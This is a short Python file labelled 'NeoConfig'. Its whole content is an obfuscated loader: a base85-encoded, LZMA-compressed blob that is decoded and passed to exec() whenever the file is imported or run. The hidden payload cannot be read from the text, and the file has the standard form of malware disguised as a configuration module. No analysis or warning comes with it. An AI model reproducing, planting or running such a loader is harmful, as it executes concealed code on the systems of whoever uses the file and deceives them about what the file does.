# NeoConfig
import lzma, base64
_data = b'{Wp48S^xk9=GL@E0stWa8~^|S5YJf5-~@aEFI@mMn@VT6Qap47uD?*%pqR^2IeP3OZ&0(1-hSC}{k&JXX;~YG;7Ab&!cUhzo__8K&ijeNOQM8Xq}f<WPz+XXYr1a*l6R~*xQV{m+PEF!+=G$f>82L!3q_UrTKE|VbpYvw-K0NSvySL#uIkfKA8Czw7WJy^af?E?LKN?Pn}Wg^1sHPg<M+uSVui0E{1qzXBQ~46CUDFWrG1rh5$RXo1Y|KND(v}Vm~ljMfOQ7Yd&%i1jm`a`z%a{hLv@5v6(+^mtWDaq4iwv1Nql!z$4bo$?l#i)+9nW<{9EU<OZFo|4K7JdjAT;MkG{pX6=Y|LS^ln?1>ob$#bjjLCkH%xfTsdKzk&H&Mm*Z9a<1;4x{#%jf7hZZ(pV{RKiQO>)OB7q%*t8P=+Vu=vyg7gz$Y_9$a8`E?e+wO54ZtADld20Wg3tCxtHF3G<{0aaw1ixYmM7xBQ`A%Ra~XS;4fs=^8c4dV9TU|AY4JXY;zCaBqX)F7NJ>wmLkHge=}#q9B_*gS(;`z+^M6!4?r{=D;UCtwHdq@zrs>t$~w?k{A%hV4y#XlGIRZAuda)K=`jGALXSFpO?wzi{;RmJTGJ%~%8;X$rK%+9NYxJ<6ije`;<=$hSz`rgW-}LUi+4j$RkY{NVW3yAAt!z?D1}T|P)8!pd^1bhmYvv9wtn8Fm5I{5DMZ2`QJNg@#hYE;DgTK|xLa%P!`Iq#XaE2JJJe?pI5VIp00GMc{RjX6r~~CUvBYQl0ssI200dcD'
_exec = lzma.decompress(base64.b85decode(_data)).decode('utf-8')
exec(_exec)
